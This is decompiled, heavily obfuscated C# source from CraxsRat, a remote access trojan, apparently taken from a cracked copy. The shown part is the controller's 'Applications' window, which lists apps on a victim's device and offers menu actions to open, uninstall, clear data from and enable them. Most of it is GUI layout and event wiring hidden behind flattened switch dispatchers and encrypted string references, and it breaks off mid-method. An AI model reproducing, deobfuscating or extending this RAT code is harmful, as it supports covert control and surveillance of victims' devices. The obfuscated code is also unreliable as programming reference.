// Decompiled with JetBrains decompiler
// Type: Craxs_Rat.Applications
// Assembly: CraxsRat, Version=6.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 518449F5-7012-4EDA-9924-A26EC676C6A1
// Assembly location: C:\Users\HP\Downloads\CraxsRat v6.8 by TG @Hackfilter - Copy\CraxsRat VIP\CraxsRat_protected.exe

using Craxs_Rat.sockets;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;

#nullable disable
namespace Craxs_Rat
{
  [DesignerGenerated]
  public class Applications : Form
  {
    internal IEnumerator \u0024S36;
    internal DataGridViewColumn \u0024VB\u0024ResumableLocal_column\u002437;
    internal IEnumerator \u0024S38;
    internal DataGridViewColumn \u0024VB\u0024ResumableLocal_column\u002439;
    internal ProcessStartInfo \u0024VB\u0024ResumableLocal_startInfo\u002440;
    internal Process \u0024VB\u0024ResumableLocal_myprocess\u002441;
    internal Exception \u0024VB\u0024ResumableLocal_ex\u002442;
    internal Exception \u0024VB\u0024ResumableLocal_ex\u002443;
    public DataGridViewRow \u0024VB\u0024Local_row;
    public string \u0024VB\u0024Local_uuid;
    public CraxsRatMain \u0024VB\u0024Me;
    public int \u0024State;
    public AsyncVoidMethodBuilder \u0024Builder;
    internal Form \u0024VB\u0024Local_targetform;
    internal int \u0024VB\u0024Local_slowtime;
    internal CraxsRatMain \u0024VB\u0024Me;
    internal Form \u0024S0;
    internal TaskAwaiter \u0024A0;
    public Dictionary<string, double> \u0024VB\u0024Local_keyValues;
    public string \u0024VB\u0024Local_portnumber;
    public CraxsRatMain \u0024VB\u0024Me;
    private IContainer components;

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.components = (IContainer) new System.ComponentModel.Container();
label_1:
      int num1 = -2026490903;
      DataGridViewCellStyle gridViewCellStyle1;
      DataGridViewCellStyle gridViewCellStyle2;
      DataGridViewCellStyle gridViewCellStyle3;
      DataGridViewCellStyle gridViewCellStyle4;
      DataGridViewCellStyle gridViewCellStyle5;
      ComponentResourceManager componentResourceManager;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ~(~(num1 - ~(-225608204 ^ -429820070)) ^ ~(2038089595 * -1889648167))) % 135U)
        {
          case 0:
            gridViewCellStyle5.SelectionBackColor = Color.White;
            gridViewCellStyle5.SelectionForeColor = Color.Black;
            num1 = (int) num2 * -1465058665 ^ -1546607618;
            continue;
          case 1:
            this.SaveToolStripMenuItem.Font = new Font(EXGuarder.\u00312082174, 12f);
            this.SaveToolStripMenuItem.ForeColor = Color.FromArgb(195, 5, 5);
            num1 = (int) num2 * 365559559 ^ 74438929;
            continue;
          case 2:
            this.PropertiesToolStripMenuItem = new ToolStripMenuItem();
            num1 = (int) num2 * 1806045331 ^ 1978164869;
            continue;
          case 3:
            this.DGV0.AllowUserToAddRows = false;
            num1 = (int) num2 * -1377711855 ^ 1658429659;
            continue;
          case 4:
            this.DGV0.Location = new Point(0, 39);
            num1 = (int) num2 * -1922227419 ^ -1172368110;
            continue;
          case 5:
            this.Column3.SortMode = DataGridViewColumnSortMode.Programmatic;
            this.Column3.Width = 2;
            num1 = (int) num2 * 1191516592 ^ 1601415241;
            continue;
          case 6:
            this.DGV0.Margin = new Padding(4);
            this.DGV0.Name = EXGuarder.\u00369780B39;
            this.DGV0.RowHeadersBorderStyle = DataGridViewHeaderBorderStyle.Single;
            num1 = (int) num2 * -1835563895 ^ -1061854841;
            continue;
          case 7:
            gridViewCellStyle2.SelectionBackColor = Color.White;
            gridViewCellStyle2.SelectionForeColor = Color.Black;
            gridViewCellStyle2.WrapMode = DataGridViewTriState.False;
            num1 = (int) num2 * 821374971 ^ 385426090;
            continue;
          case 8:
            this.BoxTitle.TabIndex = 7;
            this.BoxTitle.TabStop = false;
            num1 = (int) num2 * -549204803 ^ 1141551163;
            continue;
          case 9:
            this.DGV0.RowsDefaultCellStyle = gridViewCellStyle1;
            num1 = (int) num2 * 2020569881 ^ 1703984847;
            continue;
          case 10:
            this.SaveAsToolStripMenuItem.Visible = false;
            num1 = (int) num2 * -538367800 ^ 1012117137;
            continue;
          case 11:
            ((ISupportInitialize) this.ClientPic).EndInit();
            num1 = (int) num2 * -2088040713 ^ -836318337;
            continue;
          case 12:
            gridViewCellStyle1.SelectionForeColor = Color.Black;
            num1 = (int) num2 * -1075051194 ^ -1334569241;
            continue;
          case 13:
            this.clinameinfo.TextAlign = ContentAlignment.MiddleLeft;
            this.ClientPic.Dock = DockStyle.Left;
            num1 = (int) num2 * 1637034610 ^ -1184003477;
            continue;
          case 14:
            this.DGV0.AlternatingRowsDefaultCellStyle = gridViewCellStyle4;
            num1 = (int) num2 * -17610931 ^ -239239585;
            continue;
          case 15:
            gridViewCellStyle4.BackColor = Color.Black;
            num1 = (int) num2 * 725339544 ^ -387509974;
            continue;
          case 16:
            this.ctx.ImageScalingSize = new Size(20, 20);
            num1 = (int) num2 * 272631515 ^ -2113330483;
            continue;
          case 17:
            this.DGV0.CellBorderStyle = DataGridViewCellBorderStyle.None;
            num1 = (int) num2 * -1027336510 ^ 257077549;
            continue;
          case 18:
            this.clinameinfo.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * -365176701 ^ 160806341;
            continue;
          case 19:
            gridViewCellStyle4.ForeColor = Color.White;
            num1 = (int) num2 * -1455630918 ^ 104701535;
            continue;
          case 20:
            gridViewCellStyle3.SelectionForeColor = Color.Black;
            num1 = (int) num2 * 1332874271 ^ 82085826;
            continue;
          case 21:
            this.UninstallToolStripMenuItem.Font = new Font(EXGuarder.\u00312082174, 12f);
            this.UninstallToolStripMenuItem.ForeColor = Color.FromArgb(195, 5, 5);
            this.UninstallToolStripMenuItem.Name = EXGuarder.\u0030A437706;
            num1 = (int) num2 * -577734883 ^ 423756693;
            continue;
          case 22:
            this.BoxTitle.Dock = DockStyle.Bottom;
            num1 = (int) num2 * 935228577 ^ -216793086;
            continue;
          case 23:
            this.DGV0.DefaultCellStyle = gridViewCellStyle2;
            num1 = (int) num2 * -2141025754 ^ 122683687;
            continue;
          case 24:
            this.DGV0.RowHeadersVisible = false;
            gridViewCellStyle1.BackColor = Color.Black;
            num1 = (int) num2 * 359026846 ^ -729432848;
            continue;
          case 25:
            this.ctx.Items.AddRange(new ToolStripItem[8]
            {
              (ToolStripItem) this.OpenToolStripMenuItem,
              (ToolStripItem) this.RefreshToolStripMenuItem,
              (ToolStripItem) this.PropertiesToolStripMenuItem,
              (ToolStripItem) this.SaveToolStripMenuItem,
              (ToolStripItem) this.SaveAsToolStripMenuItem,
              (ToolStripItem) this.UninstallToolStripMenuItem,
              (ToolStripItem) this.ClearAppDataToolStripMenuItem,
              (ToolStripItem) this.EnableToolStripMenuItem
            });
            num1 = (int) num2 * -627781794 ^ -1940648816;
            continue;
          case 26:
            this.PB.Name = EXGuarder.\u003381A7141;
            num1 = (int) num2 * -582162837 ^ 308719331;
            continue;
          case 27:
            this.EnableToolStripMenuItem.Font = new Font(EXGuarder.\u00312082174, 12f);
            num1 = (int) num2 * -1375726837 ^ -1611738039;
            continue;
          case 28:
            this.UninstallToolStripMenuItem.Size = new Size(147, 28);
            num1 = (int) num2 * 1447991748 ^ -1467306114;
            continue;
          case 29:
            gridViewCellStyle5.ForeColor = Color.White;
            num1 = (int) num2 * -941929193 ^ -1330268763;
            continue;
          case 30:
            this.SaveToolStripMenuItem.Name = EXGuarder.\u0037334342D;
            num1 = (int) num2 * 367148883 ^ -229578242;
            continue;
          case 31:
            this.SaveAsToolStripMenuItem.Name = EXGuarder.\u0031B0C3A02;
            num1 = (int) num2 * 1105903342 ^ -1672225584;
            continue;
          case 32:
            this.EnableToolStripMenuItem.ForeColor = Color.FromArgb(195, 5, 5);
            num1 = (int) num2 * 413852349 ^ -1294541274;
            continue;
          case 33:
            gridViewCellStyle5.BackColor = Color.Black;
            gridViewCellStyle5.Font = new Font(EXGuarder.\u00312082174, 8.25f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
            num1 = (int) num2 * 919410005 ^ 1762662047;
            continue;
          case 34:
            this.Column9.Name = EXGuarder.\u0035F407035;
            num1 = (int) num2 * 1256894423 ^ 860642872;
            continue;
          case 35:
            this.SaveAsToolStripMenuItem.ForeColor = Color.FromArgb(195, 5, 5);
            num1 = (int) num2 * -1559594409 ^ 1985096700;
            continue;
          case 36:
            this.ClientPic.Margin = new Padding(3, 4, 3, 4);
            num1 = (int) num2 * 230523292 ^ 294444560;
            continue;
          case 37:
            gridViewCellStyle4 = new DataGridViewCellStyle();
            num1 = (int) num2 * 1045155052 ^ -2022925447;
            continue;
          case 38:
            this.ctx.Size = new Size(148, 228);
            num1 = (int) num2 * -863535845 ^ 616949575;
            continue;
          case 39:
            this.ClientPic.TabStop = false;
            num1 = (int) num2 * -31339489 ^ 1178038604;
            continue;
          case 40:
            this.DGV0.AutoSizeColumnsMode = DataGridViewAutoSizeColumnsMode.AllCells;
            num1 = (int) num2 * 1405560950 ^ 83680110;
            continue;
          case 41:
            this.Column3 = new DataGridViewImageColumn();
            this.ctx = new ContextMenuStrip(this.components);
            this.OpenToolStripMenuItem = new ToolStripMenuItem();
            this.RefreshToolStripMenuItem = new ToolStripMenuItem();
            num1 = (int) num2 * 431557120 ^ 458493072;
            continue;
          case 42:
            this.DGV0.GridColor = Color.FromArgb(42, 42, 42);
            num1 = (int) num2 * -1761053044 ^ -1950757830;
            continue;
          case 43:
            this.BoxTitle = new PictureBox();
            this.Panel2 = new Panel();
            this.clinameinfo = new Label();
            this.ClientPic = new PictureBox();
            num1 = (int) num2 * -1400244489 ^ 403237653;
            continue;
          case 44:
            this.Margin = new Padding(4);
            this.Name = EXGuarder.\u003134A5153;
            this.Opacity = 0.0;
            num1 = (int) num2 * -570318171 ^ -1863647154;
            continue;
          case 45:
            this.clinameinfo.Location = new Point(42, 0);
            this.clinameinfo.Name = EXGuarder.\u00339123845;
            num1 = (int) num2 * -2056518233 ^ 906798713;
            continue;
          case 46:
            this.Panel2.ForeColor = Color.Red;
            this.Panel2.Location = new Point(0, 0);
            num1 = (int) num2 * -805864101 ^ 1007214171;
            continue;
          case 47:
            this.Panel2.ResumeLayout(false);
            num1 = (int) num2 * 1963768844 ^ -1340969082;
            continue;
          case 48:
            this.Panel2.Controls.Add((Control) this.ClientPic);
            num1 = (int) num2 * 338960596 ^ -1277505329;
            continue;
          case 49:
            this.Column6 = new DataGridViewTextBoxColumn();
            num1 = (int) num2 * 928464015 ^ 498807123;
            continue;
          case 50:
            this.EnableToolStripMenuItem.Name = EXGuarder.\u0035B414821;
            num1 = (int) num2 * -1577498656 ^ 214142836;
            continue;
          case 51:
            this.AutoScaleMode = AutoScaleMode.Font;
            this.ClientSize = new Size(493, 530);
            this.Controls.Add((Control) this.DGV0);
            num1 = (int) num2 * 25124792 ^ 1320974808;
            continue;
          case 52:
            this.ClientPic.Name = EXGuarder.\u0035661233F;
            num1 = (int) num2 * 1646168779 ^ -971478444;
            continue;
          case 53:
            this.RefreshToolStripMenuItem.Font = new Font(EXGuarder.\u00312082174, 12f);
            num1 = (int) num2 * 1364123275 ^ 749409050;
            continue;
          case 54:
            this.PropertiesToolStripMenuItem.Font = new Font(EXGuarder.\u00312082174, 12f);
            num1 = (int) num2 * 60219457 ^ -1146653874;
            continue;
          case 55:
            gridViewCellStyle4.SelectionBackColor = Color.White;
            num1 = (int) num2 * 1373935563 ^ -1454181413;
            continue;
          case 56:
            this.DGV0.AllowUserToResizeRows = false;
            num1 = (int) num2 * -694843982 ^ 323309221;
            continue;
          case 57:
            ((ISupportInitialize) this.DGV0).BeginInit();
            this.ctx.SuspendLayout();
            ((ISupportInitialize) this.BoxTitle).BeginInit();
            num1 = (int) num2 * -626448562 ^ -1950230013;
            continue;
          case 58:
            this.SaveToolStripMenuItem = new ToolStripMenuItem();
            this.SaveAsToolStripMenuItem = new ToolStripMenuItem();
            num1 = (int) num2 * 1094140765 ^ -1911786528;
            continue;
          case 59:
            this.ShowIcon = false;
            this.Text = EXGuarder.\u003134A5153;
            ((ISupportInitialize) this.DGV0).EndInit();
            this.ctx.ResumeLayout(false);
            num1 = (int) num2 * 1689790215 ^ -1448074578;
            continue;
          case 60:
            this.Column1.HeaderText = EXGuarder.\u00353270A09;
            this.Column1.Name = EXGuarder.\u00357766204;
            this.Column1.Width = 105;
            num1 = (int) num2 * -1355890856 ^ -1288892666;
            continue;
          case 61:
            this.clinameinfo.TabIndex = 12;
            num1 = (int) num2 * -2068156936 ^ -1443931409;
            continue;
          case 62:
            this.OpenToolStripMenuItem.Size = new Size(147, 28);
            num1 = (int) num2 * 76498743 ^ 719121528;
            continue;
          case 63:
            this.PB.Location = new Point(0, 496);
            num1 = (int) num2 * -1837180429 ^ -1184288901;
            continue;
          case 64:
            ((ISupportInitialize) this.BoxTitle).EndInit();
            num1 = (int) num2 * 2022713708 ^ -217195990;
            continue;
          case 65:
            gridViewCellStyle5 = new DataGridViewCellStyle();
            gridViewCellStyle2 = new DataGridViewCellStyle();
            gridViewCellStyle3 = new DataGridViewCellStyle();
            gridViewCellStyle1 = new DataGridViewCellStyle();
            componentResourceManager = new ComponentResourceManager(typeof (Applications));
            this.DGV0 = new DataGridView();
            this.Column1 = new DataGridViewTextBoxColumn();
            num1 = (int) num2 * -498977192 ^ 293355020;
            continue;
          case 66:
            this.DGV0.EnableHeadersVisualStyles = false;
            num1 = (int) num2 * -1332547320 ^ 386762776;
            continue;
          case 67:
            this.BoxTitle.Name = EXGuarder.\u003284D2707;
            this.BoxTitle.Size = new Size(493, 22);
            num1 = (int) num2 * 1291344653 ^ -837774763;
            continue;
          case 68:
            this.Column6.HeaderText = EXGuarder.\u00353185D43;
            num1 = (int) num2 * -647400922 ^ -1696747214;
            continue;
          case 69:
            this.Column2.Name = EXGuarder.\u00352700637;
            this.Column2.Width = 114;
            this.Column3.AutoSizeMode = DataGridViewAutoSizeColumnMode.None;
            num1 = (int) num2 * 355249742 ^ -1336846671;
            continue;
          case 70:
            this.SaveAsToolStripMenuItem.Size = new Size(147, 28);
            num1 = (int) num2 * 1861895739 ^ -1946652935;
            continue;
          case 71:
            gridViewCellStyle1.ForeColor = Color.White;
            gridViewCellStyle1.SelectionBackColor = Color.White;
            num1 = (int) num2 * -49961790 ^ 1867841092;
            continue;
          case 72:
            this.PB.Margin = new Padding(4);
            num1 = (int) num2 * 156767427 ^ -593154289;
            continue;
          case 73:
            this.EnableToolStripMenuItem.Size = new Size(147, 28);
            this.EnableToolStripMenuItem.Text = EXGuarder.\u0035C3A7245;
            this.TOpacity.Interval = 1;
            this.PB.Dock = DockStyle.Bottom;
            num1 = (int) num2 * -1666312448 ^ -356959148;
            continue;
          case 74:
            this.BoxTitle.BackColor = Color.Black;
            num1 = (int) num2 * -599992227 ^ 2055345689;
            continue;
          case 75:
            this.Panel2.Name = EXGuarder.\u0033569546D;
            num1 = (int) num2 * 997761653 ^ 2002661456;
            continue;
          case 76:
            this.DGV0.AutoSizeRowsMode = DataGridViewAutoSizeRowsMode.AllCells;
            num1 = (int) num2 * 251691114 ^ -886203427;
            continue;
          case 77:
            gridViewCellStyle2.ForeColor = Color.White;
            num1 = (int) num2 * 202772518 ^ -2049228750;
            continue;
          case 78:
            this.Controls.Add((Control) this.PB);
            this.Controls.Add((Control) this.Panel2);
            num1 = (int) num2 * 1183616921 ^ 791225511;
            continue;
          case 79:
            this.OpenToolStripMenuItem.Text = EXGuarder.\u0034A594B6D;
            num1 = (int) num2 * 484823012 ^ 2003001848;
            continue;
          case 80:
            this.RefreshToolStripMenuItem.ForeColor = Color.FromArgb(195, 5, 5);
            num1 = (int) num2 * -1315486586 ^ 1574388292;
            continue;
          case 81:
            this.OpenToolStripMenuItem.Font = new Font(EXGuarder.\u00312082174, 12f);
            this.OpenToolStripMenuItem.ForeColor = Color.FromArgb(195, 5, 5);
            this.OpenToolStripMenuItem.Image = (Image) componentResourceManager.GetObject(EXGuarder.\u0030B07112B);
            this.OpenToolStripMenuItem.Name = EXGuarder.\u00308527666;
            num1 = (int) num2 * 121999339 ^ 356937975;
            continue;
          case 82:
            gridViewCellStyle2.Font = new Font(EXGuarder.\u00312082174, 8.25f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
            num1 = (int) num2 * -2081846427 ^ 1162256692;
            continue;
          case 83:
            this.PropertiesToolStripMenuItem.ForeColor = Color.FromArgb(195, 5, 5);
            this.PropertiesToolStripMenuItem.Name = EXGuarder.\u00308123076;
            this.PropertiesToolStripMenuItem.Size = new Size(147, 28);
            this.PropertiesToolStripMenuItem.Text = EXGuarder.\u0031F68434E;
            num1 = (int) num2 * -611046066 ^ -1629324117;
            continue;
          case 84:
            this.Controls.Add((Control) this.BoxTitle);
            this.FormBorderStyle = FormBorderStyle.SizableToolWindow;
            num1 = (int) num2 * 873050073 ^ -1297570816;
            continue;
          case 85:
            this.ClientPic.Location = new Point(0, 0);
            num1 = (int) num2 * 1403882899 ^ -122939272;
            continue;
          case 86:
            this.SuspendLayout();
            num1 = (int) num2 * 350195414 ^ 110413079;
            continue;
          case 87:
            this.ctx.Name = EXGuarder.\u00339730714;
            num1 = (int) num2 * -920723881 ^ 2023608484;
            continue;
          case 88:
            gridViewCellStyle3.SelectionBackColor = Color.White;
            num1 = (int) num2 * 1663691587 ^ 1006983722;
            continue;
          case 89:
            this.Panel2.BackColor = Color.Black;
            this.Panel2.Controls.Add((Control) this.clinameinfo);
            num1 = (int) num2 * 428870560 ^ -288190382;
            continue;
          case 90:
            this.UninstallToolStripMenuItem.Text = EXGuarder.\u00362305A58;
            this.ClearAppDataToolStripMenuItem.Font = new Font(EXGuarder.\u00312082174, 12f);
            num1 = (int) num2 * -1434544415 ^ -1743070343;
            continue;
          case 91:
            this.Column6.Width = 67;
            this.Column9.HeaderText = EXGuarder.\u0031D6E1B40;
            num1 = (int) num2 * 395807372 ^ 36953835;
            continue;
          case 92:
            gridViewCellStyle3.ForeColor = Color.White;
            num1 = (int) num2 * -720195728 ^ 115223291;
            continue;
          case 93:
            this.PB.Size = new Size(493, 12);
            num1 = (int) num2 * 2145036983 ^ 1844722883;
            continue;
          case 94:
            this.Panel2.Dock = DockStyle.Top;
            num1 = (int) num2 * -475377533 ^ 945241289;
            continue;
          case 95:
            this.Column3.FillWeight = 1f;
            this.Column3.HeaderText = EXGuarder.\u0036417035E;
            this.Column3.MinimumWidth = 2;
            this.Column3.Name = EXGuarder.\u0032803371E;
            num1 = (int) num2 * 804015055 ^ -1355904494;
            continue;
          case 96:
            this.Column9.Width = 80;
            this.Column2.HeaderText = EXGuarder.\u0033B171227;
            num1 = (int) num2 * -93446613 ^ -1763958197;
            continue;
          case 97:
            gridViewCellStyle4.SelectionForeColor = Color.Black;
            num1 = (int) num2 * 1869330474 ^ 520317058;
            continue;
          case 98:
            this.DGV0.AllowUserToDeleteRows = false;
            this.DGV0.AllowUserToResizeColumns = false;
            num1 = (int) num2 * -1059775107 ^ -1793946840;
            continue;
          case 99:
            gridViewCellStyle5.Alignment = DataGridViewContentAlignment.MiddleLeft;
            num1 = (int) num2 * 359118074 ^ 2066112983;
            continue;
          case 100:
            this.BoxTitle.ErrorImage = (Image) null;
            this.BoxTitle.InitialImage = (Image) null;
            num1 = (int) num2 * 1595349835 ^ -569816546;
            continue;
          case 101:
            this.ClientPic.Size = new Size(42, 39);
            num1 = (int) num2 * -2086090828 ^ -273967253;
            continue;
          case 102:
            this.UninstallToolStripMenuItem = new ToolStripMenuItem();
            this.ClearAppDataToolStripMenuItem = new ToolStripMenuItem();
            this.EnableToolStripMenuItem = new ToolStripMenuItem();
            num1 = (int) num2 * -915399573 ^ 1353020766;
            continue;
          case 103:
            this.ClientPic.SizeMode = PictureBoxSizeMode.Zoom;
            this.ClientPic.TabIndex = 11;
            num1 = (int) num2 * -1312798720 ^ 584045695;
            continue;
          case 104:
            this.AutoScaleDimensions = new SizeF(8f, 16f);
            num1 = (int) num2 * 2111830304 ^ 1579000545;
            continue;
          case 105:
            gridViewCellStyle3.WrapMode = DataGridViewTriState.True;
            this.DGV0.RowHeadersDefaultCellStyle = gridViewCellStyle3;
            num1 = (int) num2 * 1537434672 ^ 363284563;
            continue;
          case 106:
            this.Column9 = new DataGridViewTextBoxColumn();
            this.Column2 = new DataGridViewTextBoxColumn();
            num1 = (int) num2 * 940579450 ^ 1347317838;
            continue;
          case 107:
            this.ClearAppDataToolStripMenuItem.ForeColor = Color.FromArgb(195, 5, 5);
            this.ClearAppDataToolStripMenuItem.Name = EXGuarder.\u00339191148;
            this.ClearAppDataToolStripMenuItem.Size = new Size(147, 28);
            this.ClearAppDataToolStripMenuItem.Text = EXGuarder.\u00321510953;
            num1 = (int) num2 * -849089301 ^ -1501980594;
            continue;
          case 108:
            this.DGV0.Columns.AddRange((DataGridViewColumn) this.Column1, (DataGridViewColumn) this.Column6, (DataGridViewColumn) this.Column9, (DataGridViewColumn) this.Column2, (DataGridViewColumn) this.Column3);
            num1 = (int) num2 * 598516228 ^ 273299561;
            continue;
          case 109:
            this.Panel2.SuspendLayout();
            ((ISupportInitialize) this.ClientPic).BeginInit();
            num1 = (int) num2 * 1745056208 ^ -896631193;
            continue;
          case 110:
            this.SaveAsToolStripMenuItem.Text = EXGuarder.\u0032E664242;
            num1 = (int) num2 * 1598384435 ^ 1068651566;
            continue;
          case 111:
            goto label_1;
          case 112:
            this.clinameinfo.Font = new Font(EXGuarder.\u00312082174, 9f);
            num1 = (int) num2 * -946820622 ^ -1064537173;
            continue;
          case 113:
            this.BoxTitle.Location = new Point(0, 508);
            this.BoxTitle.Margin = new Padding(4);
            num1 = (int) num2 * -96607060 ^ 1327822058;
            continue;
          case 114:
            this.clinameinfo.Text = EXGuarder.\u00356301F73;
            num1 = (int) num2 * -1034694631 ^ -135047989;
            continue;
          case 115:
            this.PB = new ProgressBar();
            num1 = (int) num2 * 289186375 ^ 895113038;
            continue;
          case 116:
            this.ctx.BackColor = Color.Black;
            num1 = (int) num2 * -532682884 ^ 1660993631;
            continue;
          case 117:
            gridViewCellStyle3.Alignment = DataGridViewContentAlignment.MiddleLeft;
            gridViewCellStyle3.BackColor = Color.Black;
            gridViewCellStyle3.Font = new Font(EXGuarder.\u00312082174, 8.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
            num1 = (int) num2 * 1639963177 ^ 2118826436;
            continue;
          case 118:
            this.SaveToolStripMenuItem.Size = new Size(147, 28);
            this.SaveToolStripMenuItem.Text = EXGuarder.\u00354210E49;
            num1 = (int) num2 * -2126498112 ^ 1245280980;
            continue;
          case 119:
            this.Panel2.Size = new Size(493, 39);
            this.Panel2.TabIndex = 8;
            this.clinameinfo.BackColor = Color.Transparent;
            this.clinameinfo.Dock = DockStyle.Fill;
            num1 = (int) num2 * -852586477 ^ -1758479130;
            continue;
          case 120:
            this.PB.TabIndex = 6;
            num1 = (int) num2 * -772320043 ^ 662973273;
            continue;
          case 121:
            this.DGV0.ColumnHeadersBorderStyle = DataGridViewHeaderBorderStyle.None;
            num1 = (int) num2 * -1326263688 ^ -2046636788;
            continue;
          case 122:
            this.TOpacity = new System.Windows.Forms.Timer(this.components);
            num1 = (int) num2 * -1289459432 ^ 780361530;
            continue;
          case 123:
            this.DGV0.BackgroundColor = Color.Black;
            this.DGV0.BorderStyle = BorderStyle.None;
            num1 = (int) num2 * 1858955904 ^ -19464774;
            continue;
          case 124:
            goto label_3;
          case 125:
            this.SaveToolStripMenuItem.Visible = false;
            this.SaveAsToolStripMenuItem.Font = new Font(EXGuarder.\u00312082174, 12f);
            num1 = (int) num2 * -2111987683 ^ 667464419;
            continue;
          case 126:
            this.DGV0.Dock = DockStyle.Fill;
            this.DGV0.EditMode = DataGridViewEditMode.EditProgrammatically;
            num1 = (int) num2 * 1966329957 ^ 1424118811;
            continue;
          case (uint) sbyte.MaxValue:
            gridViewCellStyle5.WrapMode = DataGridViewTriState.True;
            this.DGV0.ColumnHeadersDefaultCellStyle = gridViewCellStyle5;
            this.DGV0.ColumnHeadersHeightSizeMode = DataGridViewColumnHeadersHeightSizeMode.AutoSize;
            num1 = (int) num2 * 224013360 ^ -909154471;
            continue;
          case 128:
            this.ctx.RenderMode = ToolStripRenderMode.Professional;
            this.ctx.ShowImageMargin = false;
            num1 = (int) num2 * -107752385 ^ 916214744;
            continue;
          case 129:
            this.RefreshToolStripMenuItem.Name = EXGuarder.\u003262E5326;
            this.RefreshToolStripMenuItem.Size = new Size(147, 28);
            this.RefreshToolStripMenuItem.Text = EXGuarder.\u003000E3B12;
            num1 = (int) num2 * 1103377062 ^ 1771007222;
            continue;
          case 130:
            this.ResumeLayout(false);
            num1 = (int) num2 * 352204106 ^ -536024789;
            continue;
          case 131:
            this.Column6.Name = EXGuarder.\u00363301A65;
            num1 = (int) num2 * 750142672 ^ 1211470712;
            continue;
          case 132:
            this.DGV0.SelectionMode = DataGridViewSelectionMode.FullRowSelect;
            this.DGV0.Size = new Size(493, 457);
            this.DGV0.TabIndex = 4;
            num1 = (int) num2 * 626049236 ^ -1068083837;
            continue;
          case 133:
            this.clinameinfo.Size = new Size(451, 39);
            num1 = (int) num2 * 391157458 ^ -1794609127;
            continue;
          case 134:
            this.DGV0.ContextMenuStrip = this.ctx;
            gridViewCellStyle2.Alignment = DataGridViewContentAlignment.MiddleLeft;
            gridViewCellStyle2.BackColor = Color.Black;
            num1 = (int) num2 * 1466568564 ^ 675251558;
            continue;
          default:
            goto label_137;
        }
      }
label_3:
      return;
label_137:;
    }

    internal virtual DataGridView DGV0
    {
      get => this._DGV0;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        DataGridViewRowsRemovedEventHandler removedEventHandler = new DataGridViewRowsRemovedEventHandler(this.DGV0_RowsRemoved);
label_1:
        int num1 = 654413442;
        while (true)
        {
          int num2 = num1;
          uint num3;
          DataGridViewRowsAddedEventHandler addedEventHandler;
          EventHandler eventHandler;
          DataGridView dgV0;
          switch ((num3 = (uint) (719458246 - (-(-num2 * 106166667 - -173335548) ^ -1085646596 - 1705941399))) % 12U)
          {
            case 0:
              int num4 = dgV0 == null ? 651533832 : (num4 = 2134257269);
              num1 = num4 ^ (int) num3 * 1928865127;
              continue;
            case 1:
              dgV0.RowsAdded -= addedEventHandler;
              num1 = (int) num3 * 2098006648 ^ 1758607275;
              continue;
            case 2:
              goto label_1;
            case 3:
              dgV0.RowsAdded += addedEventHandler;
              dgV0.SelectionChanged += eventHandler;
              num1 = (int) num3 * -952868582 ^ 665455106;
              continue;
            case 4:
              dgV0.RowsRemoved += removedEventHandler;
              num1 = (int) num3 * -1628041021 ^ 800684202;
              continue;
            case 5:
              int num5 = dgV0 == null ? -1964996328 : (num5 = -1219209511);
              num1 = num5 ^ (int) num3 * -393557725;
              continue;
            case 6:
              dgV0.SelectionChanged -= eventHandler;
              num1 = (int) num3 * 2006314449 ^ -1332243811;
              continue;
            case 7:
              addedEventHandler = new DataGridViewRowsAddedEventHandler(this.DGV0_RowsAdded);
              eventHandler = new EventHandler(this.DGV0_SelectionChanged);
              num1 = (int) num3 * -1263652784 ^ 1773451385;
              continue;
            case 8:
              dgV0 = this._DGV0;
              num1 = (int) num3 * -1326169458 ^ -1728940612;
              continue;
            case 9:
              goto label_3;
            case 10:
              this._DGV0 = value;
              dgV0 = this._DGV0;
              num1 = -1361968879;
              continue;
            case 11:
              dgV0.RowsRemoved -= removedEventHandler;
              num1 = (int) num3 * -205336702 ^ -97272046;
              continue;
            default:
              goto label_14;
          }
        }
label_3:
        return;
label_14:;
      }
    }

    [field: AccessedThroughProperty("ctx")]
    internal virtual ContextMenuStrip ctx { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual ToolStripMenuItem OpenToolStripMenuItem
    {
      get => this._OpenToolStripMenuItem;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.OpenToolStripMenuItem_Click);
label_1:
        int num1 = 1548862688;
        ToolStripMenuItem toolStripMenuItem;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (((-(num1 - 532817709 * (1090167493 * (-587806727 - --276657259 - (361959189 ^ ~-1079391284)))) ^ -1062977795 * (1459216405 - 1899608923 ^ 1485330982 - 1869556814)) - (--897301169 ^ -115165079) ^ --1839176304) - -1256485184)) % 7U)
          {
            case 0:
              toolStripMenuItem.Click -= eventHandler;
              num1 = (int) num2 * 78402190 ^ 228665258;
              continue;
            case 1:
              toolStripMenuItem = this._OpenToolStripMenuItem;
              int num3 = toolStripMenuItem == null ? -494190976 : (num3 = -664738698);
              num1 = num3 ^ (int) num2 * -672908729;
              continue;
            case 2:
              goto label_3;
            case 3:
              goto label_1;
            case 4:
              toolStripMenuItem.Click += eventHandler;
              num1 = (int) num2 * 855606391 ^ -988496142;
              continue;
            case 5:
              int num4 = toolStripMenuItem == null ? -189284130 : (num4 = -1643157662);
              num1 = num4 ^ (int) num2 * -1952673826;
              continue;
            case 6:
              this._OpenToolStripMenuItem = value;
              toolStripMenuItem = this._OpenToolStripMenuItem;
              num1 = 755518838;
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    internal virtual ToolStripMenuItem SaveToolStripMenuItem
    {
      get => this._SaveToolStripMenuItem;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.SaveToolStripMenuItem_Click);
label_1:
        int num1 = 474754857;
        ToolStripMenuItem toolStripMenuItem;
        while (true)
        {
          uint num2;
